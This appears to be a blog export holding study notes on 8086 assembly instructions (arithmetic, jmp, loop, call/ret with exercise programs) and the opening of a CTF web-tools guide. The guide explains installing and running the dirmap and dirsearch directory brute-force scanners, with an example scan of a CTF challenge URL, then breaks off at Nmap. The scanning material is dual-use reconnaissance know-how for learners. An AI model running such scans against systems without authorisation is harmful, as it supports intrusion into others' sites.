<h2 id="8-3-段地址和偏移地址"><a href="#8-3-段地址和偏移地址" class="headerlink" title="8.3.段地址和偏移地址"></a>8.3.段地址和偏移地址</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604631953216.png" alt="1604631953216"></p>
<h2 id="8-4-寻址方式"><a href="#8-4-寻址方式" class="headerlink" title="8.4.寻址方式"></a>8.4.寻址方式</h2><p><img src="/2024/06/09/Assembley-language/blog/source/_posts/Assembley-language/1604631995576.png" alt="1604631995576"></p>
<blockquote>
<ul>
<li>用BX,DX,SI做间址寄存器寻找操作数时，隐含规定段基址由DS提供</li>
<li>当BP做间址寄存器寻找操作数时，隐含规定段基址由SS提供</li>
</ul>
</blockquote>
<h2 id="8-5-指令要处理的数据有多长"><a href="#8-5-指令要处理的数据有多长" class="headerlink" title="8.5.指令要处理的数据有多长"></a>8.5.指令要处理的数据有多长</h2><blockquote>
<p>使用操作符X ptr 指明内存单元的长度，X 在汇编中可以指定为word 或者 byte</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604632157945.png" alt="1604632157945"></p>
<h2 id="8-6-算术运算类指令"><a href="#8-6-算术运算类指令" class="headerlink" title="8.6.算术运算类指令"></a>8.6.算术运算类指令</h2><h3 id="ADD加法指令"><a href="#ADD加法指令" class="headerlink" title="ADD加法指令"></a>ADD加法指令</h3><p>格式：ADD	DEST,	SCR</p>
<p>功能：将源操作数SCR和目的操作数DEST相加，结果存入DEST中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD AX,X</span><br><span class="line">ADD AL,0A4H			;十六进制开头如果是A~F，需在开头加上一个数字0，不占位</span><br></pre></td></tr></table></figure>

<h3 id="ADC带进位加指令"><a href="#ADC带进位加指令" class="headerlink" title="ADC带进位加指令"></a>ADC带进位加指令</h3><p>格式：ADC	DEST,	SCR</p>
<p>功能：将源操作数SCR和目的操作数DEST以及进位标志CF位相加，结果存入DEST中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADC BX,9F88H</span><br><span class="line">ADC AX,208AH</span><br></pre></td></tr></table></figure>

<h3 id="XADD交换加法指令"><a href="#XADD交换加法指令" class="headerlink" title="XADD交换加法指令"></a>XADD交换加法指令</h3><p>格式：XADD	DEST,	SCR</p>
<p>功能：将源操作数SCR和目的操作数DEST相加，结果存入DEST中，原来的目的操作数DEST放入源操作数SRC中</p>
<p>DEST+SCR—&gt;DEST,    原DEST—&gt;SCR</p>
<h3 id="INC自增指令"><a href="#INC自增指令" class="headerlink" title="INC自增指令"></a>INC自增指令</h3><p>格式：INC 	DEST</p>
<p>功能：将目的操作数DEST自身增加1，结果存入DEST中，即DEST&lt;-DEST+1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INC SI</span><br></pre></td></tr></table></figure>

<p>注：INC指令对CF进位标志位无影响</p>
<h3 id="SUB减法指令"><a href="#SUB减法指令" class="headerlink" title="SUB减法指令"></a>SUB减法指令</h3><p>格式：SUB	DEST,	SRC</p>
<p>功能：将目的操作数DEST内容减去源操作数SRC内容，结果输入DEST中，即DEST&lt;-DEST-SRC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUB EAX,EBX	;CF=1	EAX=00000034H	EBX=00000052H</span><br><span class="line">;结果为EAX=FFFFFFE2H		CF=1</span><br></pre></td></tr></table></figure>

<h3 id="SBB带借位减法"><a href="#SBB带借位减法" class="headerlink" title="SBB带借位减法"></a>SBB带借位减法</h3><p>格式：SBB	DEST,	SRC</p>
<p>功能：将目的操作数DEST内容减去源操作数SRC内容及CF位，结果输入DEST中，即DEST&lt;-DEST-SRC-CF</p>
<p>说明：SBB指令主要用于大于16位的多精度的减法，把低位部分相减的借位引入高位部分的减法中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SBB AX, BX;CF=1		AX=4037H		BX=2342H</span><br><span class="line">;结果为AX=1CF4H		CF=0</span><br></pre></td></tr></table></figure>

<h3 id="DEC自减指令"><a href="#DEC自减指令" class="headerlink" title="DEC自减指令"></a>DEC自减指令</h3><p>格式：DEC	DEST</p>
<p>格式：将目的操作数DEST自身减1，结果存入DEST中，即DEST&lt;-DEST-1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEC SI</span><br></pre></td></tr></table></figure>

<h3 id="CMP比较指令"><a href="#CMP比较指令" class="headerlink" title="CMP比较指令"></a>CMP比较指令</h3><p>格式：CMP	DEST,	SRC</p>
<p>功能：目的操作数DEST减去源操作数SRC，即DEST-SRC</p>
<p>说明：CMP比较指令将两个操作数相减，但相减的结果并不保留，两个操作数都保留原值不变，只是将相减的结果的特征反应在各个状态标志位上。</p>
<blockquote>
<p><strong>执行CMP指令后，如果标志位ZF&#x3D;1，说明被比较的两个数相等；</strong></p>
<p><strong>两个数的大小查看CF标志位，如果标志位CF&#x3D;1，说明出现借位，SRC更大；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMP AX,BX		;AX-BX</span><br><span class="line">JE	NEXT		;JE表示如果两个数相等，即AX=BX，则跳转至标号NEXT</span><br><span class="line">;JE[Jump Equal]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>条件</th>
<th>大于</th>
<th>小于</th>
<th>等于</th>
</tr>
</thead>
<tbody><tr>
<td>带符号数</td>
<td>G</td>
<td>L</td>
<td>E</td>
</tr>
<tr>
<td>无符号数</td>
<td>A</td>
<td>B</td>
<td>E</td>
</tr>
</tbody></table>
</blockquote>
<h3 id="NEG取补指令"><a href="#NEG取补指令" class="headerlink" title="NEG取补指令"></a>NEG取补指令</h3><p>格式：NEG	DEST</p>
<p>功能：零0减去目的操作数DEST，结果存入目的操作数DEST,即DEST&lt;—0-DEST</p>
<p>说明：NEG指令是求操作数的负数，即改变操作数的符号，这对带符号数即为求其补码。NEG对标志位的影响：如果被取补的操作数非0，NEG操作后，CF置1，否则CF&#x3D;0;</p>
<h3 id="MUL无符号数乘法指令"><a href="#MUL无符号数乘法指令" class="headerlink" title="MUL无符号数乘法指令"></a>MUL无符号数乘法指令</h3><p>格式：MUL	SRC</p>
<p>功能：若SRC为字节长度，则AX&lt;—AL*SRC;若SRC为字长度，则DX:AX&lt;—AX*SRC[EAX&lt;—AX*SRC]</p>
<p>说明：乘法指令格式中只出现源操作数SRC，根据操作数的类型决定是8位乘法还是16位乘法。<u><strong>SRC不能是立即数(立即数无类型属性)</strong></u>，目的操作数（被乘数）隐含约定为累加器AL(8位乘)或AX(16位乘)，运算结果约定在AX(8位乘法的积)或EAX(16位乘法的积)</p>
<blockquote>
<p>若乘积的高半部全为0，则CF&#x3D;OF&#x3D;0</p>
<p>若乘积的高半部不全为0，则CF&#x3D;OF&#x3D;1</p>
</blockquote>
<h3 id="IMUL带符号数乘法指令"><a href="#IMUL带符号数乘法指令" class="headerlink" title="IMUL带符号数乘法指令"></a>IMUL带符号数乘法指令</h3><p>格式：IMUL	SRC</p>
<p>功能：若SRC为字节长度，则AX&lt;—AL*SRC;若SRC为字长度，则DX:AX&lt;—AX*SRC[EAX&lt;—AX*SRC]</p>
<p>说明： 乘法指令只影响进位标志位CF和溢出标志位OF。对于MUL，如果乘积的高半部(8位乘时为AH，16位乘时为DX)为零0，CF&#x3D;0，OF&#x3D;0；否则CF&#x3D;OF&#x3D;1(表示AH或DX中有乘积的有效数字)。若积的高半部是低半部的符号扩展，则CF&#x3D;OF&#x3D;0，否则CF&#x3D;OF&#x3D;1；</p>
<h3 id="DIV无符号数除法指令和IDIV带符号数除法指令"><a href="#DIV无符号数除法指令和IDIV带符号数除法指令" class="headerlink" title="DIV无符号数除法指令和IDIV带符号数除法指令"></a>DIV无符号数除法指令和IDIV带符号数除法指令</h3><p>格式：DIV	SRC；IDIV	SRC</p>
<p>div 是除法指令，使用div 做除法的时候注意以下问题</p>
<p>**<u>要求被除数默认存放在ax,或者dx和ax中，而且要求被除数的位数，必须是除数的2倍</u>**，比如说，除数位8位，被除数就为16位。为什么被除数的位数一定要为除数的2倍呢？</p>
<blockquote>
<p>因为CPU只会做加法运算，把其它一切的算法都转换成加法，比如说，除数 就先转换加法，例如36&#x2F;6  当CPU看到这个运算时，就会这样想，需要多少个6 相加才能得到36呢，然后CPU就从1个6 ，2个6………..这样一种算下去，终于最后发现原来是6个6啊，从这我们可以看出，CPU是不断的用除数相加，知道找到结果为止，这就出现问题了，如果被除数不是除数位数的2倍，再相加的过程中，就可能超出除数的位数所能表达的最大数值，从而越界，如果能保证 被除数是除数的2倍 ，这问题就能解决了，例如：8 &#x2F;5   5+ 5 &#x3D;10 超出所能表达的位数，08 &#x2F;5 就可以解决这个问题</p>
</blockquote>
<ol>
<li>除数：有8位和16位两种，在一个REG或者内存单元中</li>
<li>被除数：默认放在AX或者 DX和AX中，<strong>如果除数为8位，被除数为16位，默认在AX中存放；<u>如果除数为16位，被除数为32位，在DX和AX中存放，DX存高16位，AX存低16位</u></strong></li>
<li>商：如果除数为8位，AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，AX存储除法操作的商，DX存储除法操作的余数</li>
</ol>
<h3 id="CWB字扩展指令"><a href="#CWB字扩展指令" class="headerlink" title="CWB字扩展指令"></a>CWB字扩展指令</h3><p>格式：CWB</p>
<p>功能：对AL中的带符号数进行符号扩展。若AL&lt;0,AH &#x3D;0FFH,否则AH&#x3D;0.</p>
<blockquote>
<table>
<thead>
<tr>
<th>扩展指令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>CWB</td>
<td>AL符号扩展到AH中每一位，</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
</blockquote>
<h2 id="8-7-伪指令dd"><a href="#8-7-伪指令dd" class="headerlink" title="8.7.伪指令dd"></a>8.7.伪指令dd</h2><p>db 和 dw 定义字节型数据和字型数据，dd 用来定义dword（double world，双字）型数据</p>
<h2 id="dup"><a href="#dup" class="headerlink" title="dup"></a>dup</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604634131753.png" alt="1604634131753"></p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604634144346.png" alt="1604634144346"></p>
<h1 id="9-转义指令"><a href="#9-转义指令" class="headerlink" title="9.转义指令"></a>9.转义指令</h1><h2 id="9-1-操作符-offset"><a href="#9-1-操作符-offset" class="headerlink" title="9.1.操作符 offset"></a>9.1.操作符 offset</h2><blockquote>
<p>功能：取得标号的偏移地址</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604906127084.png" alt="1604906127084"></p>
<p>上图的案例：取得标号start和s的偏移地址为0和3</p>
<h2 id="9-2-根据位移进行转移的jmp指令"><a href="#9-2-根据位移进行转移的jmp指令" class="headerlink" title="9.2.根据位移进行转移的jmp指令"></a>9.2.根据位移进行转移的jmp指令</h2><blockquote>
<p>jmp short 标号(转到标号处执行指令)</p>
</blockquote>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604908133361.png" alt="1604908133361"></p>
<h2 id="9-3-转移的目的地址在指令中的jmp指令"><a href="#9-3-转移的目的地址在指令中的jmp指令" class="headerlink" title="9.3.转移的目的地址在指令中的jmp指令"></a>9.3.转移的目的地址在指令中的jmp指令</h2><p><img src="https://gitee.com/kingwempity/images/raw/master/images/1604990737283.png" alt="1604990737283"></p>
<p>将跳转到<strong>CS:IP</strong>所在的地址</p>
<h2 id="9-4-转移指令在寄存器中的jmp指令"><a href="#9-4-转移指令在寄存器中的jmp指令" class="headerlink" title="9.4.转移指令在寄存器中的jmp指令"></a>9.4.转移指令在寄存器中的jmp指令</h2><blockquote>
<p>指令格式：jmp 16 位 reg</p>
<p>功能：(IP)&#x3D;（16位reg）</p>
</blockquote>
<h2 id="9-5-转移指令在内存中jmp指令"><a href="#9-5-转移指令在内存中jmp指令" class="headerlink" title="9.5.转移指令在内存中jmp指令"></a>9.5.转移指令在内存中jmp指令</h2><blockquote>
<p>jmp word ptr 内存单元地址（段内转移）</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br><span class="line">执行后，（IP）=0123H</span><br></pre></td></tr></table></figure>

<blockquote>
<p>jmp dword ptr 内存单元地址（段间转移）</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br><span class="line"></span><br><span class="line">执行后，（cs）=0,（IP）=0123H，CS:IP指向0000:0123</span><br></pre></td></tr></table></figure>

<h2 id="9-6-jcxz指令"><a href="#9-6-jcxz指令" class="headerlink" title="9.6.jcxz指令"></a>9.6.jcxz指令</h2><blockquote>
<p>当（cx）不等于0时，什么也不做，程序向下执行</p>
<p>当cx&#x3D;&#x3D;0，jmp short 标号；</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">补全编程，利用jcxz指令，实现在内存2000H段中查找第一个值为0的字节，找到后，将它的偏移地址存贮在dx中。</span></span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start: mov ax,2000h</span><br><span class="line"> mov ds,ax</span><br><span class="line"> mov bx,0</span><br><span class="line"> s: mov cl, [bx]  # 注意需要保存字节</span><br><span class="line"> mov ch,0</span><br><span class="line"> jcxz ok</span><br><span class="line"> inc bx</span><br><span class="line"> jmp short s</span><br><span class="line"> ok:mov dx,bx</span><br><span class="line"> mov ax,4c00h</span><br><span class="line"> int 21h</span><br><span class="line">code ends</span><br><span class="line">end star</span><br></pre></td></tr></table></figure>

<h2 id="9-7-loop指令"><a href="#9-7-loop指令" class="headerlink" title="9.7.loop指令"></a>9.7.loop指令</h2><blockquote>
<p>loop指令位循环指令，为短转移，相当于</p>
<p>(cx)–</p>
<p>if ((cx)≠0) jmp short 标号；</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">;************************************************************</span><br><span class="line">;利用loop指令,实现在内存2000H段中查找第一个值为零的byte,找到后 </span><br><span class="line">;将它的偏移地址存储到dx中 </span><br><span class="line">;************************************************************* </span><br><span class="line">assume cs:code </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line"></span><br><span class="line">start: </span><br><span class="line">   mov ax,2000H</span><br><span class="line">   mov ds,ax</span><br><span class="line">   mov bx,0</span><br><span class="line">s: </span><br><span class="line">   mov cl,[bx]</span><br><span class="line">   mov ch,0</span><br><span class="line">   inc cx      # 当cx为0，然后加一</span><br><span class="line">   inc bx</span><br><span class="line">   loop s     # 这边会减一，然后当cx等于0 就会直接跳到下一步ok</span><br><span class="line">ok: </span><br><span class="line">   dec bx</span><br><span class="line">   mov dx,bx</span><br><span class="line"></span><br><span class="line">   mov ax,4c00h</span><br><span class="line">   int 21h</span><br><span class="line"></span><br><span class="line">code ends </span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h1 id="10-CALL和RET指令"><a href="#10-CALL和RET指令" class="headerlink" title="10.CALL和RET指令"></a>10.CALL和RET指令</h1><h2 id="10-1-ret和retf指令"><a href="#10-1-ret和retf指令" class="headerlink" title="10.1.ret和retf指令"></a>10.1.ret和retf指令</h2><blockquote>
<p>CPU执行ret指令，相当于<strong>pop IP</strong></p>
<p>CPU执行retf指令，相当于<strong>pop IP 和 pop CS</strong></p>
</blockquote>
<p>监测点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补全程序，实现从内存1000：0000处开始执行指令。</span><br><span class="line"></span><br><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">	db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start: mov ax,stack</span><br><span class="line">	   mov ss,ax</span><br><span class="line">	   mov sp,16</span><br><span class="line">	   mov ax,1000h</span><br><span class="line">	   push ax</span><br><span class="line">	   mov ax,0</span><br><span class="line">	   push ax</span><br><span class="line">	   retf</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h2 id="10-2-根据位移进行转移的call指令"><a href="#10-2-根据位移进行转移的call指令" class="headerlink" title="10.2.根据位移进行转移的call指令"></a>10.2.根据位移进行转移的call指令</h2><blockquote>
<p>CPU执行call 标号，相当于进行</p>
<ul>
<li>push IP</li>
<li>jmp near ptr 标号</li>
</ul>
</blockquote>
<p>检测点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下面程序执行后，ax中的数值是多少？</span><br><span class="line">1000：0 	mov ax,0		;读取此条指令后IP=3 ，执行完该指令后IP=3</span><br><span class="line">1000：3 	call s			;读取此条指令后IP=6 ，所以IP=6入栈，执行完该指令后IP=7，跳转到s处</span><br><span class="line">1000：6 	inc ax</span><br><span class="line">1000：7 	s:pop ax		；所以POP后，ax=6</span><br></pre></td></tr></table></figure>

<h2 id="10-3-转移目的地址在指令中的call指令"><a href="#10-3-转移目的地址在指令中的call指令" class="headerlink" title="10.3.转移目的地址在指令中的call指令"></a>10.3.转移目的地址在指令中的call指令</h2><blockquote>
<p>call far ptr 标号：实现段间转移。相当于进行如下操作</p>
<p>push CS</p>
<p>push IP</p>
<p>jmp far ptr 标号</p>
</blockquote>
<p>监测点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下面程序执行后,ax中的数值为多少?</span><br><span class="line"></span><br><span class="line">内存地址	             机器码	                  汇编指令</span><br><span class="line">1000:0	             b8 00 00                 mov ax,0</span><br><span class="line">1000:3               9a 09 00 00 10           call far ptr s </span><br><span class="line">1000:8               40                       inc ax</span><br><span class="line">1000:9               58                     s:pop ax</span><br><span class="line">                                              add ax,ax  * 8h+8h=10h</span><br><span class="line">                                              pop bx</span><br><span class="line">                                              add ax,bx  * 1000h+10h=1010h</span><br><span class="line"></span><br><span class="line">call far ptr s :此时IP为8h push 1000h push 8h</span><br></pre></td></tr></table></figure>

<h2 id="10-4-转移地址在寄存器中的call指令"><a href="#10-4-转移地址在寄存器中的call指令" class="headerlink" title="10.4.转移地址在寄存器中的call指令"></a>10.4.转移地址在寄存器中的call指令</h2><blockquote>
<p>指令格式：call 16位 reg</p>
<p>功能：</p>
<ul>
<li>push IP</li>
<li>jmp 16 位 reg</li>
</ul>
</blockquote>
<p>检测点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这儿用到了bp，除了之前这样用过bp外 [bx+bp] ，还会在栈中用到。</span><br><span class="line">比如说，堆栈中压入了很多数据或者地址，你肯定想通过SP来访问这些数据或者地址，但SP是要指向栈顶的，是不能随便乱改的，这时候你就需要使用BP，把SP的值传递给BP，通过BP来寻找堆栈里数据或者地址</span><br><span class="line"></span><br><span class="line">1000:0    mov ax,6</span><br><span class="line">1000:2    call ax	;相当于push IP=5 ,jmp ax=6 ,此指令未改变CS的值</span><br><span class="line">1000:5    inc ax	;未执行</span><br><span class="line">1000:6    mov bp,sp</span><br><span class="line">          add ax,[bp]	;相当于add ax,[sp],默认段地址ss，所以即把栈顶元素弹出和AX相加6+5=11=BH</span><br></pre></td></tr></table></figure>

<h2 id="10-5-转移地址在内存中的call指令"><a href="#10-5-转移地址在内存中的call指令" class="headerlink" title="10.5.转移地址在内存中的call指令"></a>10.5.转移地址在内存中的call指令</h2><blockquote>
<p>call word ptr 内存单元地址，相当于进行：</p>
<p>push IP</p>
<p>jmp word ptr 内存单元地址</p>
</blockquote>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov sp,10h,</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br><span class="line"></span><br><span class="line">执行后，IP=0123h，sp=10h-2=0Eh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>call dword ptr 内存单元地址，相当于进行：</p>
<p>push CS</p>
<p>push IP</p>
<p>jmp dwod ptr 内存单元地址</p>
</blockquote>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br><span class="line"></span><br><span class="line">执行后，cs=0 IP=0123h sp=10h-4=0Ch</span><br></pre></td></tr></table></figure>

<p>检测点</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/1605247814500.png" alt="1605247814500"></p>
<hr>
<hr>
<h1 id="参考书籍"><a href="#参考书籍" class="headerlink" title="参考书籍"></a>参考书籍</h1><p><a href="https://kingwempity.github.io/PDF/Assembly_Languages_BY_ShuangWang.pdf">《汇编语言(第3版) 》王爽著.pdf</a></p>
]]></content>
      <categories>
        <category>Languages</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>CtfWeb_TOOL</title>
    <url>/2024/07/08/CtfWeb-TOOL/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<h2 id="扫描篇"><a href="#扫描篇" class="headerlink" title="扫描篇"></a>扫描篇</h2><h4 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h4><p><strong>(一)介绍</strong></p>
<p>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑</p>
<p><strong>(二)安装</strong></p>
<p>github中搜索dirmap</p>
<p><img src="https://gitee.com/kingwempity/images/raw/master/images/dirmap1.png" alt="dirmap1"></p>
<p>复制链接于linux 中使用git clone下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># git clone https://github.com/H4ckForJob/dirmap.git </span></span><br><span class="line">正克隆到 <span class="string">&#x27;dirmap&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 449, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (193/193), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (82/82), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 449 (delta 124), reused 131 (delta 111), pack-reused 256</span><br><span class="line">接收对象中: 100% (449/449), 1.86 MiB | 2.02 MiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (229/229), 完成.</span><br></pre></td></tr></table></figure>

<p>下载完成，使用cd 切换至安装目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cd dirmap   </span></span><br><span class="line">                                                                               </span><br><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">data         dirmap.py  lib      README_EN.md  requirement.txt</span><br><span class="line">dirmap.conf  doc        LICENSE  README.md     thirdlib</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用python3 使用dirmap.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># python3 dirmap.py</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/dirmap/dirmap.py&quot;</span>, line 14, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from gevent import monkey</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;gevent&#x27;</span></span><br></pre></td></tr></table></figure>

<p>发现需要安装依赖包，查看reqirement.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># cat requirement.txt </span></span><br><span class="line">gevent</span><br><span class="line">requests</span><br><span class="line">progressbar2</span><br><span class="line">lxml     </span><br></pre></td></tr></table></figure>

<p>安装依赖包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># pip3 install requests progressbar2 lxml gevent</span></span><br></pre></td></tr></table></figure>

<p>使用dirmap.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/dirmap]</span><br><span class="line">└─<span class="comment"># python3 dirmap.py </span></span><br><span class="line"></span><br><span class="line">                     <span class="comment">#####  # #####  #    #   ##   #####</span></span><br><span class="line">                     <span class="comment">#    # # #    # ##  ##  #  #  #    #</span></span><br><span class="line">                     <span class="comment">#    # # #    # # ## # #    # #    #</span></span><br><span class="line">                     <span class="comment">#    # # #####  #    # ###### #####</span></span><br><span class="line">                     <span class="comment">#    # # #   #  #    # #    # #</span></span><br><span class="line">                     <span class="comment">#####  # #    # #    # #    # #   v1.0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装成功！</p>
<p><strong>使用方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usage: python3 dirmap.py -i https://target.com -lcf</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">Engine:</span><br><span class="line">  Engine config</span><br><span class="line"></span><br><span class="line">  -t THREAD_NUM, --thread THREAD_NUM</span><br><span class="line">                        num of threads, default 30</span><br><span class="line"></span><br><span class="line">Target:</span><br><span class="line">  Target config</span><br><span class="line"></span><br><span class="line">  -i TARGET             scan a target or network (e.g. [http://]target.com ,</span><br><span class="line">                        192.168.1.1[/24] , 192.168.1.1-192.168.1.100)</span><br><span class="line">  -iF FILE              load targets from targetFile (e.g. urls.txt)</span><br><span class="line"></span><br><span class="line">Bruter:</span><br><span class="line">  Bruter config</span><br><span class="line"></span><br><span class="line">  -lcf, --loadConfigFile</span><br><span class="line">                        Load the configuration through the configuration file</span><br><span class="line">  --debug               Print payloads and <span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/kingwempity/images/raw/master/images/dirmap2.png" alt="dirmap2"></p>
<blockquote>
<p><strong>用法：python3 dirmap.py -i 目标网址 -lcf 载入配置文件</strong></p>
<p><strong>其他参数 ：</strong></p>
<p><strong>-h 帮助文档</strong></p>
<p><strong>-t 线程 默认30</strong></p>
<p><strong>-i 目标网址</strong></p>
<p><strong>-iF 目标网址文件</strong></p>
<p><strong>-lcf 载入暴力破解配置文件</strong></p>
<p><strong>–debug 打印攻击载荷并退出</strong></p>
</blockquote>
<h4 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h4><p><strong>(一)介绍</strong></p>
<p>dirsearch是一个基于python的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件。</p>
<p><strong>(二)安装</strong></p>
<p>github中搜索dirsearch</p>
<p>github下载地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
<p><strong>(三)使用方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Options:</span><br><span class="line">  --version             show program<span class="string">&#x27;s version number and exit</span></span><br><span class="line"><span class="string">  -h, --help            show this help message and exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Mandatory:</span></span><br><span class="line"><span class="string">    -u URL, --url=URL   Target URL(s), can use multiple flags</span></span><br><span class="line"><span class="string">    -l PATH, --url-file=PATH</span></span><br><span class="line"><span class="string">                        URL list file</span></span><br><span class="line"><span class="string">    --stdin             Read URL(s) from STDIN</span></span><br><span class="line"><span class="string">    --cidr=CIDR         Target CIDR</span></span><br><span class="line"><span class="string">    --raw=PATH          Load raw HTTP request from file (use `--scheme` flag</span></span><br><span class="line"><span class="string">                        to set the scheme)</span></span><br><span class="line"><span class="string">    -s SESSION_FILE, --session=SESSION_FILE</span></span><br><span class="line"><span class="string">                        Session file</span></span><br><span class="line"><span class="string">    --config=PATH       Full path to config file, see &#x27;</span>config.ini<span class="string">&#x27; for example</span></span><br><span class="line"><span class="string">                        (Default: config.ini)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>-u URL, --url=URL                        URL目标

-L URLLIST, --url-list=URLLIST           URL列表目标
                    
-e EXTENSIONS, --extensions=EXTENSIONS   以逗号分隔的扩展列表（示例：php、asp）
                    
-E, --extensions-list                    使用公共扩展的预定义列表
</code></pre>
</blockquote>
<p>例子：</p>
<p>dirsearch -u <a href="https://8549d992-7179-4cf6-9ecf-233632ea3429.challenge.ctf.show/">https://8549d992-7179-4cf6-9ecf-233632ea3429.challenge.ctf.show/</a></p>
<h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p><strong>(一)介绍</strong></p>
<p>Nmap(Network Mapper(网络映射器））一款开源的网络探测和安全审核工具</p>
<p><strong>(二)安装</strong></p>
<p>kali虚拟机自带，或安装Namp GUI</p>
<p><strong>(三)使用方法</strong></p>
